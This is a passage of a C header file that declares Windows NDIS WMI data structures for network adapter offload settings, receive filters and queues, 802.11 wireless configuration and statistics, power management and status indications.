  UCHAR UDPIPv4Checksum;
  UCHAR TCPIPv6Checksum;
  UCHAR UDPIPv6Checksum;
  UCHAR LsoV1;
  UCHAR IPsec;
  UCHAR LsoV2IPv4;
  UCHAR LsoV2IPv6;
  UCHAR TcpConnectionIPv4;
  UCHAR TcpConnectionIPv6;
  ULONG Flags;
} MSNdis_TcpOffloadParameters, *PMSNdis_TcpOffloadParameters;

typedef struct _MSNdis_WmiTcpConnectionOffload {
  MSNdis_ObjectHeader Header;
  ULONG Encapsulation;
  ULONG SupportIp4;
  ULONG SupportIp6;
  ULONG SupportIp6ExtensionHeaders;
  ULONG SupportSack;
  ULONG TcpConnectionOffloadCapacity;
  ULONG Flags;
} MSNdis_WmiTcpConnectionOffload, *PMSNdis_WmiTcpConnectionOffload;

typedef struct _MSNdis_WmiHDSplitCurrentConfig {
  MSNdis_ObjectHeader Header;
  ULONG HardwareCapabilities;
  ULONG CurrentCapabilities;
  ULONG HDSplitFlags;
  ULONG HDSplitCombineFlags;
  ULONG BackfillSize;
  ULONG MaxHeaderSize;
} MSNdis_WmiHDSplitCurrentConfig, *PMSNdis_WmiHDSplitCurrentConfig;

typedef struct _MSNdis_HDSplitParameters {
  MSNdis_ObjectHeader Header;
  ULONG HDSplitCombineFlags;
} MSNdis_HDSplitParameters, *PMSNdis_HDSplitParameters;

typedef struct _MSNdis_WmiReceiveScaleCapabilities {
  MSNdis_ObjectHeader Header;
  ULONG CapabilitiesFlags;
  ULONG NumberOfInterruptMessages;
  ULONG NumberOfReceiveQueues;
} MSNdis_WmiReceiveScaleCapabilities, *PMSNdis_WmiReceiveScaleCapabilities;

typedef struct _MSNdis_ReceiveFilterCapabilities {
  MSNdis_ObjectHeader Header;
  ULONG Flags;
  ULONG EnabledFilterTypes;
  ULONG EnabledQueueTypes;
  ULONG NumQueues;
  ULONG SupportedQueueProperties;
  ULONG SupportedFilterTests;
  ULONG SupportedHeaders;
  ULONG SupportedMacHeaderFields;
  ULONG MaxMacHeaderFilters;
  ULONG MaxQueueGroups;
  ULONG MaxQueuesPerQueueGroup;
  ULONG MinLookaheadSplitSize;
  ULONG MaxLookaheadSplitSize;
} MSNdis_ReceiveFilterCapabilities, *PMSNdis_ReceiveFilterCapabilities;

typedef struct _MSNdis_ReceiveFilterGlobalParameters {
  MSNdis_ObjectHeader Header;
  ULONG Flags;
  ULONG EnabledFilterTypes;
  ULONG EnabledQueueTypes;
} MSNdis_ReceiveFilterGlobalParameters, *PMSNdis_ReceiveFilterGlobalParameters;

typedef struct _MSNdis_CountedString {
  USHORT Length;
  SHORT String[257];
} MSNdis_CountedString, *PMSNdis_CountedString;

typedef struct _MSNdis_ReceiveFilterInfo {
  MSNdis_ObjectHeader Header;
  ULONG Flags;
  ULONG FilterType;
  ULONG FilterId;
} MSNdis_ReceiveFilterInfo, *PMSNdis_ReceiveFilterInfo;

typedef struct _MSNdis_ReceiveFilterInfoArray {
  MSNdis_ObjectHeader Header;
  ULONG QueueId;
  ULONG FirstElementOffset;
  ULONG NumElements;
  ULONG ElementSize;
  MSNdis_ReceiveFilterInfo Filter[1];
} MSNdis_ReceiveFilterInfoArray, *PMSNdis_ReceiveFilterInfoArray;

typedef struct _MSNdis_ReceiveFilterFieldParameters {
  MSNdis_ObjectHeader Header;
  ULONG Flags;
  ULONG FrameHeader;
  ULONG ReceiveFilterTest;
  ULONG MacHeaderField;
  UCHAR FieldByteArrayValue[16];
  UCHAR ResultByteArrayValue[16];
} MSNdis_ReceiveFilterFieldParameters, *PMSNdis_ReceiveFilterFieldParameters;

typedef struct _MSNdis_ReceiveFilterParameters {
  MSNdis_ObjectHeader Header;
  ULONG Flags;
  ULONG FilterType;
  ULONG QueueId;
  ULONG FilterId;
  ULONG FieldParametersArrayOffset;
  ULONG FieldParametersArrayNumElements;
  ULONG FieldParametersArrayElementSize;
  ULONG RequestedFilterIdBitCount;
  MSNdis_ReceiveFilterFieldParameters FieldParameters[1];
} MSNdis_ReceiveFilterParameters, *PMSNdis_ReceiveFilterParameters;

typedef struct _MSNdis_NicSwitchCapabilities {
  MSNdis_ObjectHeader Header;
  ULONG Flags;
  ULONG NdisReserved1;
  ULONG NumTotalMacAddresses;
  ULONG NumMacAddressesPerPort;
  ULONG NumVlansPerPort;
  ULONG NdisReserved2;
  ULONG NdisReserved3;
} MSNdis_NicSwitchCapabilities, *PMSNdis_NicSwitchCapabilities;

typedef struct _MSNdis_GroupAffinity {
  ULONGLONG Mask;
  USHORT Group;
  USHORT Reserved[3];
} MSNdis_GroupAffinity, *PMSNdis_GroupAffinity;

typedef struct _MSNdis_ReceiveQueueParameters {
  MSNdis_ObjectHeader Header;
  ULONG Flags;
  ULONG QueueType;
  ULONG QueueId;
  ULONG QueueGroupId;
  MSNdis_GroupAffinity ProcessorAffinity;
  ULONG NumSuggestedReceiveBuffers;
  ULONG MSIXTableEntry;
  ULONG LookaheadSize;
  MSNdis_CountedString VmName;
  MSNdis_CountedString QueueName;
} MSNdis_ReceiveQueueParameters, *PMSNdis_ReceiveQueueParameters;

typedef struct _MSNdis_ReceiveQueueInfo {
  MSNdis_ObjectHeader Header;
  ULONG Flags;
  ULONG QueueType;
  ULONG QueueId;
  ULONG QueueGroupId;
  ULONG QueueState;
  MSNdis_GroupAffinity ProcessorAffinity;
  ULONG NumSuggestedReceiveBuffers;
  ULONG MSIXTableEntry;
  ULONG LookaheadSize;
  MSNdis_CountedString VmName;
  MSNdis_CountedString QueueName;
} MSNdis_ReceiveQueueInfo, *PMSNdis_ReceiveQueueInfo;

typedef struct _MSNdis_ReceiveQueueInfoArray {
  MSNdis_ObjectHeader Header;
  ULONG FirstElementOffset;
  ULONG NumElements;
  ULONG ElementSize;
  MSNdis_ReceiveQueueInfo Queue[1];
} MSNdis_ReceiveQueueInfoArray, *PMSNdis_ReceiveQueueInfoArray;

typedef struct _WmiQueryLinkState_IN {
  MSNdis_WmiMethodHeader Header;
} WmiQueryLinkState_IN, *PWmiQueryLinkState_IN;

typedef struct _WmiQueryLinkState_OUT {
  MSNdis_LinkStateData LinkState;
} WmiQueryLinkState_OUT, *PWmiQueryLinkState_OUT;

typedef struct _WmiQueryInterruptModeration_IN {
  MSNdis_WmiMethodHeader Header;
} WmiQueryInterruptModeration_IN, *PWmiQueryInterruptModeration_IN;

typedef struct _WmiQueryInterruptModeration_OUT {
  MSNdis_InterruptModerationParameters InterruptModeration;
} WmiQueryInterruptModeration_OUT, *PWmiQueryInterruptModeration_OUT;

typedef struct _WmiSetInterruptModeration_IN {
  MSNdis_WmiMethodHeader MethodHeader;
  MSNdis_InterruptModerationParameters InterruptModeration;
} WmiSetInterruptModeration_IN, *PWmiSetInterruptModeration_IN;

typedef struct _WmiSetInterruptModeration_OUT {
  MSNdis_WmiOutputInfo OutputInfo;
} WmiSetInterruptModeration_OUT, *PWmiSetInterruptModeration_OUT;

typedef struct _WmiSetLinkParameters_IN {
  MSNdis_WmiMethodHeader MethodHeader;
  MSNdis_LinkParameters LinkParameters;
} WmiSetLinkParameters_IN, *PWmiSetLinkParameters_IN;

typedef struct _WmiSetLinkParameters_OUT {
  MSNdis_WmiOutputInfo OutputInfo;
} WmiSetLinkParameters_OUT, *PWmiSetLinkParameters_OUT;

typedef struct _WmiQueryStatisticsInfo_IN {
  MSNdis_WmiMethodHeader Header;
} WmiQueryStatisticsInfo_IN, *PWmiQueryStatisticsInfo_IN;

typedef struct _WmiQueryStatisticsInfo_OUT {
  MSNdis_StatisticsInfo StatisticsInfo;
} WmiQueryStatisticsInfo_OUT, *PWmiQueryStatisticsInfo_OUT;

typedef struct _WmiQueryPortState_IN {
  MSNdis_WmiMethodHeader Header;
} WmiQueryPortState_IN, *PWmiQueryPortState_IN;

typedef struct _WmiQueryPortState_OUT {
  MSNdis_PortStateData PortState;
} WmiQueryPortState_OUT, *PWmiQueryPortState_OUT;

typedef struct _WmiEnumeratePorts_IN {
  MSNdis_WmiMethodHeader Header;
} WmiEnumeratePorts_IN, *PWmiEnumeratePorts_IN;

typedef struct _WmiEnumeratePorts_OUT {
  MSNdis_PortArray Ports;
} WmiEnumeratePorts_OUT, *PWmiEnumeratePorts_OUT;

typedef struct _WmiSetPortParameters_IN {
  MSNdis_WmiMethodHeader MethodHeader;
  MSNdis_PortAuthParameters PortParameters;
} WmiSetPortParameters_IN, *PWmiSetPortParameters_IN;

typedef struct _WmiSetPortParameters_OUT {
  MSNdis_WmiOutputInfo OutputInfo;
} WmiSetPortParameters_OUT, *PWmiSetPortParameters_OUT;

typedef struct _WmiQueryPciDeviceCustomProperty_IN {
  MSNdis_WmiMethodHeader Header;
} WmiQueryPciDeviceCustomProperty_IN, *PWmiQueryPciDeviceCustomProperty_IN;

typedef struct _WmiQueryPciDeviceCustomProperty_OUT {
  MSNdis_PciDeviceProperty PciDeviceProperty;
} WmiQueryPciDeviceCustomProperty_OUT, *PWmiQueryPciDeviceCustomProperty_OUT;

typedef struct _MSNdis_EnumerateAdapterEx {
  MSNdis_WmiEnumAdapter EnumerateAdapter;
} MSNdis_EnumerateAdapterEx, *PMSNdis_EnumerateAdapterEx;

typedef struct _WmiQueryCurrentOffloadConfig_IN {
  MSNdis_WmiMethodHeader Header;
} WmiQueryCurrentOffloadConfig_IN, *PWmiQueryCurrentOffloadConfig_IN;

typedef struct _WmiQueryCurrentOffloadConfig_OUT {
  MSNdis_WmiOffload Offload;
} WmiQueryCurrentOffloadConfig_OUT, *PWmiQueryCurrentOffloadConfig_OUT;

typedef struct _WmiQueryHardwareOffloadConfig_IN {
  MSNdis_WmiMethodHeader Header;
} WmiQueryHardwareOffloadConfig_IN, *PWmiQueryHardwareOffloadConfig_IN;

typedef struct _WmiQueryHardwareOffloadConfig_OUT {
  MSNdis_WmiOffload Offload;
} WmiQueryHardwareOffloadConfig_OUT, *PWmiQueryHardwareOffloadConfig_OUT;

typedef struct _WmiSetTcpOffloadParameters_IN {
  MSNdis_WmiMethodHeader MethodHeader;
  MSNdis_TcpOffloadParameters TcpOffloadParameters;
} WmiSetTcpOffloadParameters_IN, *PWmiSetTcpOffloadParameters_IN;

typedef struct _WmiSetTcpOffloadParameters_OUT {
  MSNdis_WmiOutputInfo OutputInfo;
} WmiSetTcpOffloadParameters_OUT, *PWmiSetTcpOffloadParameters_OUT;

typedef struct _WmiQueryTcpConnectionOffloadCurrentConfig_IN {
  MSNdis_WmiMethodHeader Header;
} WmiQueryTcpConnectionOffloadCurrentConfig_IN, *PWmiQueryTcpConnectionOffloadCurrentConfig_IN;

typedef struct _WmiQueryTcpConnectionOffloadCurrentConfig_OUT {
  MSNdis_WmiTcpConnectionOffload Offload;
} WmiQueryTcpConnectionOffloadCurrentConfig_OUT, *PWmiQueryTcpConnectionOffloadCurrentConfig_OUT;

typedef struct _WmiQueryTcpConnectionOffloadHardwareConfig_IN {
  MSNdis_WmiMethodHeader Header;
} WmiQueryTcpConnectionOffloadHardwareConfig_IN, *PWmiQueryTcpConnectionOffloadHardwareConfig_IN;

typedef struct _WmiQueryTcpConnectionOffloadHardwareConfig_OUT {
  MSNdis_WmiTcpConnectionOffload Offload;
} WmiQueryTcpConnectionOffloadHardwareConfig_OUT, *PWmiQueryTcpConnectionOffloadHardwareConfig_OUT;

typedef struct _WmiQueryReceiveScaleCapabilities_IN {
  MSNdis_WmiMethodHeader Header;
} WmiQueryReceiveScaleCapabilities_IN, *PWmiQueryReceiveScaleCapabilities_IN;

typedef struct _WmiQueryReceiveScaleCapabilities_OUT {
  MSNdis_WmiReceiveScaleCapabilities RssCaps;
} WmiQueryReceiveScaleCapabilities_OUT, *PWmiQueryReceiveScaleCapabilities_OUT;

typedef struct _WmiQueryHDSplitCurrentConfig_IN {
  MSNdis_WmiMethodHeader Header;
} WmiQueryHDSplitCurrentConfig_IN, *PWmiQueryHDSplitCurrentConfig_IN;

typedef struct _WmiQueryHDSplitCurrentConfig_OUT {
  MSNdis_WmiHDSplitCurrentConfig HdSplitCurrentConfig;
} WmiQueryHDSplitCurrentConfig_OUT, *PWmiQueryHDSplitCurrentConfig_OUT;

typedef struct _WmiSetHDSplitParameters_IN {
  MSNdis_WmiMethodHeader MethodHeader;
  MSNdis_HDSplitParameters HDSplitParameters;
} WmiSetHDSplitParameters_IN, *PWmiSetHDSplitParameters_IN;

typedef struct _WmiSetHDSplitParameters_OUT {
  MSNdis_WmiOutputInfo OutputInfo;
} WmiSetHDSplitParameters_OUT, *PWmiSetHDSplitParameters_OUT;

typedef struct _WmiQueryPhysicalMediumTypeEx_IN {
  MSNdis_WmiMethodHeader Header;
} WmiQueryPhysicalMediumTypeEx_IN, *PWmiQueryPhysicalMediumTypeEx_IN;

typedef struct _WmiQueryPhysicalMediumTypeEx_OUT {
  ULONG NdisPhysicalMediumTypeEx;
} WmiQueryPhysicalMediumTypeEx_OUT, *PWmiQueryPhysicalMediumTypeEx_OUT;

typedef struct _WmiQueryReceiveFilterHardwareCapabilities_IN {
  MSNdis_WmiMethodHeader Header;
} WmiQueryReceiveFilterHardwareCapabilities_IN, *PWmiQueryReceiveFilterHardwareCapabilities_IN;

typedef struct _WmiQueryReceiveFilterHardwareCapabilities_OUT {
  MSNdis_ReceiveFilterCapabilities ReceiveFilterHardwareCapabilities;
} WmiQueryReceiveFilterHardwareCapabilities_OUT, *PWmiQueryReceiveFilterHardwareCapabilities_OUT;

typedef struct _WmiQueryReceiveFilterGlobalParameters_IN {
  MSNdis_WmiMethodHeader Header;
} WmiQueryReceiveFilterGlobalParameters_IN, *PWmiQueryReceiveFilterGlobalParameters_IN;

typedef struct _WmiQueryReceiveFilterGlobalParameters_OUT {
  MSNdis_ReceiveFilterGlobalParameters ReceiveFilterGlobalParameters;
} WmiQueryReceiveFilterGlobalParameters_OUT, *PWmiQueryReceiveFilterGlobalParameters_OUT;

typedef struct _WmiEnumReceiveFilters_IN {
  MSNdis_WmiMethodHeader Header;
  MSNdis_ReceiveFilterInfoArray ReceiveFilterInfoArray;
} WmiEnumReceiveFilters_IN, *PWmiEnumReceiveFilters_IN;

typedef struct _WmiEnumReceiveFilters_OUT {
  MSNdis_ReceiveFilterInfoArray ReceiveFilterInfoArray;
} WmiEnumReceiveFilters_OUT, *PWmiEnumReceiveFilters_OUT;

typedef struct _WmiQueryReceiveFilterParameters_IN {
  MSNdis_WmiMethodHeader Header;
  MSNdis_ReceiveFilterParameters ReceiveFilterParameters;
} WmiQueryReceiveFilterParameters_IN, *PWmiQueryReceiveFilterParameters_IN;

typedef struct _WmiQueryReceiveFilterParameters_OUT {
  MSNdis_ReceiveFilterParameters ReceiveFilterParameters;
} WmiQueryReceiveFilterParameters_OUT, *PWmiQueryReceiveFilterParameters_OUT;

typedef struct _WmiQueryReceiveFilterCurrentCapabilities_IN {
  MSNdis_WmiMethodHeader Header;
} WmiQueryReceiveFilterCurrentCapabilities_IN, *PWmiQueryReceiveFilterCurrentCapabilities_IN;

typedef struct _WmiQueryReceiveFilterCurrentCapabilities_OUT {
  MSNdis_ReceiveFilterCapabilities ReceiveFilterCurrentCapabilities;
} WmiQueryReceiveFilterCurrentCapabilities_OUT, *PWmiQueryReceiveFilterCurrentCapabilities_OUT;

typedef struct _WmiQueryNICSwitchHardwareCapabilities_IN {
  MSNdis_WmiMethodHeader Header;
} WmiQueryNICSwitchHardwareCapabilities_IN, *PWmiQueryNICSwitchHardwareCapabilities_IN;

typedef struct _WmiQueryNICSwitchHardwareCapabilities_OUT {
  MSNdis_NicSwitchCapabilities NicSwitchHardwareCapabilities;
} WmiQueryNICSwitchHardwareCapabilities_OUT, *PWmiQueryNICSwitchHardwareCapabilities_OUT;

typedef struct _WmiQueryNICSwitchCurrentCapabilities_IN {
  MSNdis_WmiMethodHeader Header;
} WmiQueryNICSwitchCurrentCapabilities_IN, *PWmiQueryNICSwitchCurrentCapabilities_IN;

typedef struct _WmiQueryNICSwitchCurrentCapabilities_OUT {
  MSNdis_NicSwitchCapabilities NicSwitchCurrentCapabilities;
} WmiQueryNICSwitchCurrentCapabilities_OUT, *PWmiQueryNICSwitchCurrentCapabilities_OUT;

typedef struct _WmiQueryReceiveQueueParameters_IN {
  MSNdis_WmiMethodHeader Header;
  MSNdis_ReceiveQueueParameters ReceiveQueueParameters;
} WmiQueryReceiveQueueParameters_IN, *PWmiQueryReceiveQueueParameters_IN;

typedef struct _WmiQueryReceiveQueueParameters_OUT {
  MSNdis_ReceiveQueueParameters ReceiveQueueParameters;
} WmiQueryReceiveQueueParameters_OUT, *PWmiQueryReceiveQueueParameters_OUT;

typedef struct _WmiEnumReceiveQueues_IN {
  MSNdis_WmiMethodHeader Header;
  MSNdis_ReceiveQueueInfoArray ReceiveQueueInfoArray;
} WmiEnumReceiveQueues_IN, *PWmiEnumReceiveQueues_IN;

typedef struct _WmiEnumReceiveQueues_OUT {
  MSNdis_ReceiveQueueInfoArray ReceiveQueueInfoArray;
} WmiEnumReceiveQueues_OUT, *PWmiEnumReceiveQueues_OUT;

typedef struct _MSNdis_80211_BaseServiceSetIdentifier {
  UCHAR Ndis80211MacAddress[6];
} MSNdis_80211_BaseServiceSetIdentifier, *PMSNdis_80211_BaseServiceSetIdentifier;

typedef struct _MSNdis_80211_ServiceSetIdentifier {
  UCHAR Ndis80211SsId[33];
} MSNdis_80211_ServiceSetIdentifier, *PMSNdis_80211_ServiceSetIdentifier;

typedef struct _MSNdis_80211_NetworkType {
  ULONG Ndis80211NetworkType;
} MSNdis_80211_NetworkType, *PMSNdis_80211_NetworkType;

typedef struct _MSNdis_80211_NetworkTypesSupported {
  ULONG NumberOfItems;
  MSNdis_80211_NetworkType Ndis80211NetworkTypes[1];
} MSNdis_80211_NetworkTypesSupported, *PMSNdis_80211_NetworkTypesSupported;

typedef struct _MSNdis_80211_NetworkTypeInUse {
  MSNdis_80211_NetworkType Ndis80211NetworkTypeInUse;
} MSNdis_80211_NetworkTypeInUse, *PMSNdis_80211_NetworkTypeInUse;

typedef struct _MSNdis_80211_PowerMode {
  ULONG Ndis80211PowerMode;
} MSNdis_80211_PowerMode, *PMSNdis_80211_PowerMode;

typedef struct _MSNdis_80211_TransmitPowerLevel {
  ULONG Ndis80211TransmitPowerLevel;
} MSNdis_80211_TransmitPowerLevel, *PMSNdis_80211_TransmitPowerLevel;

typedef struct _MSNdis_80211_ReceivedSignalStrength {
  LONG Ndis80211ReceivedSignalStrength;
} MSNdis_80211_ReceivedSignalStrength, *PMSNdis_80211_ReceivedSignalStrength;

typedef struct _MSNdis_80211_ReceivedSignalStrengthEventTrigger {
  LONG Ndis80211ReceivedSignalStrengthTrigger;
} MSNdis_80211_ReceivedSignalStrengthEventTrigger, *PMSNdis_80211_ReceivedSignalStrengthEventTrigger;

typedef struct _MSNdis_80211_NetworkInfrastructure {
  ULONG Ndis80211NetworkInfrastructure;
} MSNdis_80211_NetworkInfrastructure, *PMSNdis_80211_NetworkInfrastructure;

typedef struct _MSNdis_80211_ConfigurationFH {
  ULONG FHLength;
  ULONG HopPattern;
  ULONG HopSet;
  ULONG DwellTime;
} MSNdis_80211_ConfigurationFH, *PMSNdis_80211_ConfigurationFH;

typedef struct _MSNdis_80211_ConfigurationInfo {
  ULONG ConfigLength;
  ULONG BeaconPeriod;
  ULONG ATIMWindow;
  ULONG DSConfig;
  MSNdis_80211_ConfigurationFH FHConfig;
} MSNdis_80211_ConfigurationInfo, *PMSNdis_80211_ConfigurationInfo;

typedef struct _MSNdis_80211_WLanBssId {
  ULONG Ndis80211WLanBssIdLength;
  UCHAR Ndis80211MacAddress[6];
  USHORT Reserved;
  ULONG Ndis80211SsIdLength;
  UCHAR Ndis80211SsId[32];
  ULONG Ndis80211Privacy;
  ULONG Ndis80211Rssi;
  MSNdis_80211_NetworkType Ndis80211NetworkTypeInUse;
  MSNdis_80211_ConfigurationInfo Ndis80211Configuration;
  MSNdis_80211_NetworkInfrastructure Ndis80211InfrastructureMode;
  UCHAR Ndis80211SupportedRate[8];
} MSNdis_80211_WLanBssId, *PMSNdis_80211_WLanBssId;

typedef struct _MSNdis_80211_BSSIList {
  ULONG NumberOfItems;
  MSNdis_80211_WLanBssId Ndis80211BSSIList[1];
} MSNdis_80211_BSSIList, *PMSNdis_80211_BSSIList;

typedef struct _MSNdis_80211_InfrastructureMode {
  MSNdis_80211_NetworkInfrastructure Ndis80211InfrastructureMode;
} MSNdis_80211_InfrastructureMode, *PMSNdis_80211_InfrastructureMode;

typedef struct _MSNdis_80211_FragmentationThreshold {
  ULONG Ndis80211FragmentationThreshold;
} MSNdis_80211_FragmentationThreshold, *PMSNdis_80211_FragmentationThreshold;

typedef struct _MSNdis_80211_RTSThreshold {
  ULONG Ndis80211RTSThreshold;
} MSNdis_80211_RTSThreshold, *PMSNdis_80211_RTSThreshold;

typedef struct _MSNdis_80211_NumberOfAntennas {
  ULONG Ndis80211NumberOfAntennas;
} MSNdis_80211_NumberOfAntennas, *PMSNdis_80211_NumberOfAntennas;

typedef struct _MSNdis_80211_ReceiveAntennaSelected {
  ULONG Ndis80211ReceiveAntennaSelected;
} MSNdis_80211_ReceiveAntennaSelected, *PMSNdis_80211_ReceiveAntennaSelected;

typedef struct _MSNdis_80211_TransmitAntennaSelected {
  ULONG Ndis80211TransmitAntennaSelected;
} MSNdis_80211_TransmitAntennaSelected, *PMSNdis_80211_TransmitAntennaSelected;

typedef struct _MSNdis_80211_DataRates {
  UCHAR Ndis80211DataRate[8];
} MSNdis_80211_DataRates, *PMSNdis_80211_DataRates;

typedef struct _MSNdis_80211_DesiredDataRates {
  UCHAR Ndis80211DesiredRate[8];
} MSNdis_80211_DesiredDataRates, *PMSNdis_80211_DesiredDataRates;

typedef struct _MSNdis_80211_Configuration {
  MSNdis_80211_ConfigurationInfo Ndis80211Config;
} MSNdis_80211_Configuration, *PMSNdis_80211_Configuration;

typedef struct _MSNdis_80211_Statistics {
  ULONG StatisticsLength;
  ULONGLONG TransmittedFragmentCount;
  ULONGLONG MulticastTransmittedFrameCount;
  ULONGLONG FailedCount;
  ULONGLONG RetryCount;
  ULONGLONG MultipleRetryCount;
  ULONGLONG RTSSuccessCount;
  ULONGLONG RTSFailureCount;
  ULONGLONG ACKFailureCount;
  ULONGLONG FrameDuplicateCount;
  ULONGLONG ReceivedFragmentCount;
  ULONGLONG MulticastReceivedFrameCount;
  ULONGLONG FCSErrorCount;
} MSNdis_80211_Statistics, *PMSNdis_80211_Statistics;

typedef struct _MSNdis_80211_AddWEP {
  ULONG Length;
  ULONG KeyIndex;
  ULONG KeyLength;
  UCHAR KeyMaterial[1];
} MSNdis_80211_AddWEP, *PMSNdis_80211_AddWEP;

typedef struct _MSNdis_80211_RemoveWEP {
  ULONG Ndis80211KeyIndex;
} MSNdis_80211_RemoveWEP, *PMSNdis_80211_RemoveWEP;

typedef struct _MSNdis_80211_Disassociate {
  ULONG UnusedParameter;
} MSNdis_80211_Disassociate, *PMSNdis_80211_Disassociate;

typedef struct _MSNdis_80211_BssIdListScan {
  ULONG UnusedParameter;
} MSNdis_80211_BssIdListScan, *PMSNdis_80211_BssIdListScan;

typedef struct _MSNdis_80211_AuthenticationMode {
  ULONG Ndis80211AuthenticationMode;
} MSNdis_80211_AuthenticationMode, *PMSNdis_80211_AuthenticationMode;

typedef struct _MSNdis_80211_PrivacyFilter {
  ULONG Ndis80211PrivacyFilter;
} MSNdis_80211_PrivacyFilter, *PMSNdis_80211_PrivacyFilter;

typedef struct _MSNdis_80211_WEPStatus {
  ULONG Ndis80211WEPStatus;
} MSNdis_80211_WEPStatus, *PMSNdis_80211_WEPStatus;

typedef struct _MSNdis_80211_ReloadDefaults {
  ULONG Ndis80211ReloadDefaults;
} MSNdis_80211_ReloadDefaults, *PMSNdis_80211_ReloadDefaults;

typedef struct _MSNdis_PMAdminConfigState {
  ULONG NdisPMAdminConfigState;
} MSNdis_PMAdminConfigState, *PMSNdis_PMAdminConfigState;

typedef struct _MSNdis_PMAdminConfigParam {
  MSNdis_ObjectHeader Header;
  MSNdis_PMAdminConfigState WakeOnPattern;
  MSNdis_PMAdminConfigState WakeOnMagicPacket;
  MSNdis_PMAdminConfigState DeviceSleepOnDisconnect;
  MSNdis_PMAdminConfigState PMARPOffload;
  MSNdis_PMAdminConfigState PMNDOffload;
  MSNdis_PMAdminConfigState PMWiFiRekeyOffload;
} MSNdis_PMAdminConfigParam, *PMSNdis_PMAdminConfigParam;

typedef struct _MSNdis_PMAdminConfig {
  MSNdis_PMAdminConfigParam PMAdminConfigParam;
} MSNdis_PMAdminConfig, *PMSNdis_PMAdminConfig;

typedef struct _MSNdis_PMCapabilityState {
  ULONG NdisPMCapabilityState;
} MSNdis_PMCapabilityState, *PMSNdis_PMCapabilityState;

typedef struct _MSNdis_PMCapabilitiesParam {
  MSNdis_ObjectHeader Header;
  MSNdis_PMCapabilityState WakeOnPattern;
  MSNdis_PMCapabilityState WakeOnMagicPacket;
  MSNdis_PMCapabilityState DeviceSleepOnDisconnect;
  MSNdis_PMCapabilityState PMARPOffload;
  MSNdis_PMCapabilityState PMNDOffload;
  MSNdis_PMCapabilityState PMWiFiRekeyOffload;
} MSNdis_PMCapabilitiesParam, *PMSNdis_PMCapabilitiesParam;

typedef struct _MSNdis_PMCapabilities {
  MSNdis_PMCapabilitiesParam PMCapabilitiesParam;
} MSNdis_PMCapabilities, *PMSNdis_PMCapabilities;

typedef struct _MSNdis_StatusMediaSpecificIndication {
  ULONG NumberElements;
  UCHAR NdisStatusMediaSpecificIndication[1];
} MSNdis_StatusMediaSpecificIndication, *PMSNdis_StatusMediaSpecificIndication;

typedef struct _MSNdis_StatusLinkSpeedChange {
  MSNdis_NetworkLinkSpeed NdisStatusLinkSpeedChange;
} MSNdis_StatusLinkSpeedChange, *PMSNdis_StatusLinkSpeedChange;

typedef struct _MSNdis_StatusProtocolBind {
  CHAR VariableData[1];
} MSNdis_StatusProtocolBind, *PMSNdis_StatusProtocolBind;

typedef struct _MSNdis_StatusProtocolUnbind {
  CHAR VariableData[1];
} MSNdis_StatusProtocolUnbind, *PMSNdis_StatusProtocolUnbind;

typedef struct _MSNdis_StatusDevicePowerOn {
  CHAR VariableData[1];
} MSNdis_StatusDevicePowerOn, *PMSNdis_StatusDevicePowerOn;

typedef struct _MSNdis_StatusDevicePowerOff {
  CHAR VariableData[1];
} MSNdis_StatusDevicePowerOff, *PMSNdis_StatusDevicePowerOff;

typedef struct _MSNdis_StatusDevicePowerOnEx {
  CHAR VariableData[1];
} MSNdis_StatusDevicePowerOnEx, *PMSNdis_StatusDevicePowerOnEx;

typedef struct _MSNdis_StatusDevicePowerOffEx {
  CHAR VariableData[1];
} MSNdis_StatusDevicePowerOffEx, *PMSNdis_StatusDevicePowerOffEx;

typedef struct _MSNdis_StatusTaskOffloadChange {
  ULONG NumberElements;
  UCHAR TaskOffloadCapabilities[1];
} MSNdis_StatusTaskOffloadChange, *PMSNdis_StatusTaskOffloadChange;

typedef struct _MSNdis_StatusPacketFilterChange {
  ULONG NumberElements;
  UCHAR NdisPacketFilterStatusIndication[1];
} MSNdis_StatusPacketFilterChange, *PMSNdis_StatusPacketFilterChange;

typedef struct _MSNdis_StatusNetworkChange {
  ULONG NumberElements;
  UCHAR NdisNetworkChangeStatusIndication[1];
} MSNdis_StatusNetworkChange, *PMSNdis_StatusNetworkChange;

typedef struct _MSNdis_StatusOperationalStatus {
  ULONG NumberElements;
  UCHAR NdisOperationalStatusStatusIndication[1];
} MSNdis_StatusOperationalStatus, *PMSNdis_StatusOperationalStatus;

typedef struct _MSNdis_StatusLinkState {
  ULONG NumberElements;
  UCHAR NdisLinkStateStatusIndication[1];
} MSNdis_StatusLinkState, *PMSNdis_StatusLinkState;

typedef struct _MSNdis_StatusPortState {
  ULONG NumberElements;
  UCHAR NdisPortStateStatusIndication[1];
} MSNdis_StatusPortState, *PMSNdis_StatusPortState;

typedef struct _MSNdis_StatusMediaSpecificIndicationEx {
  ULONG NumberElements;
  UCHAR NdisStatusMediaSpecificIndication[1];
} MSNdis_StatusMediaSpecificIndicationEx, *PMSNdis_StatusMediaSpecificIndicationEx;

typedef struct _MSNdis_StatusHDSplitCurrentConfig {
  ULONG NumberElements;
  UCHAR HDSplitCurrentConfig[1];
} MSNdis_StatusHDSplitCurrentConfig, *PMSNdis_StatusHDSplitCurrentConfig;

typedef struct _MSNdis_StatusDot11ScanConfirm {
  ULONG NumberElements;
  UCHAR NdisStatusDot11ScanConfirmIndication[1];
} MSNdis_StatusDot11ScanConfirm, *PMSNdis_StatusDot11ScanConfirm;

typedef struct _MSNdis_StatusDot11MPDUMaxLengthChange {
  ULONG NumberElements;
  UCHAR NdisStatusDot11MPDUMaxLengthChangeIndication[1];
} MSNdis_StatusDot11MPDUMaxLengthChange, *PMSNdis_StatusDot11MPDUMaxLengthChange;

typedef struct _MSNdis_StatusDot11AssociationStart {
  ULONG NumberElements;
  UCHAR NdisStatusDot11AssociationStartIndication[1];
} MSNdis_StatusDot11AssociationStart, *PMSNdis_StatusDot11AssociationStart;

typedef struct _MSNdis_StatusDot11AssociationCompletion {
  ULONG NumberElements;
  UCHAR NdisStatusDot11AssociationCompletionIndication[1];
} MSNdis_StatusDot11AssociationCompletion, *PMSNdis_StatusDot11AssociationCompletion;

typedef struct _MSNdis_StatusDot11ConnectionStart {
  ULONG NumberElements;
  UCHAR NdisStatusDot11ConnectionStartIndication[1];
} MSNdis_StatusDot11ConnectionStart, *PMSNdis_StatusDot11ConnectionStart;

typedef struct _MSNdis_StatusDot11ConnectionCompletion {
  ULONG NumberElements;
  UCHAR NdisStatusDot11ConnectionCompletionIndication[1];
} MSNdis_StatusDot11ConnectionCompletion, *PMSNdis_StatusDot11ConnectionCompletion;

typedef struct _MSNdis_StatusDot11RoamingStart {
